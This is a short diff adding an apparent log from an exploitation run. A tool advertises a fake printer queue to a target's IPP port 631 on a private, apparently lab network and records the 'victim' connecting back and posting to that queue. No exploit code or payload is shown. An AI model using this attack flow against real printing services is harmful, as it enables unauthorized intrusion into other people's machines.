@@ -1,0 +1,7 @@
+15:15:51 [INFO] Target: 172.18.0.2
+15:15:51 [INFO] Advertising: 172.18.0.1:9999  queue=v3port
+.15:15:51 [INFO] Sent announcement to 172.18.0.2:631
+15:15:51 [WARNING] >>> VICTIM CONNECTED BACK from 172.18.0.2:55846
+15:15:51 [INFO] POST /printers/v3port HTTP/1.1
+
+Sent 1 packets.
